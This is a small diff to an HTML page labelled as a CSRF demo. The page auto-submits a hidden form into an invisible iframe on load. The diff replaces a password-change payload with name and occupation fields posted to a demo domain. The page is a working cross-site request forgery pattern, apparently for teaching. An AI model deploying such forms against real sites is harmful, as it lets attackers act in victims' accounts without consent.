@@ -7,9 +7,9 @@
 </head>
 <body onload="document.csrfForm.submit()">
   <h3>Forgery Form Used for CSRF DEMO</h3>
-  <form action="http://www.tjcchen.cn" method="POST" target="hiddenFrame" name="csrfForm">
-    <input type="hidden" name="newPassword" value="fakePassword" />
-    <input type="hidden" name="confirmPassword" value="fakePassword" />
+  <form action="http://www.tjcchen.cn/post" method="POST" target="hiddenFrame" name="csrfForm">
+    <input type="hidden" name="name" value="jackie">
+    <input type="hidden" name="occupation" value="sde">
   </form>
   <iframe name="hiddenFrame" style="display:none;"></iframe>
 </body>
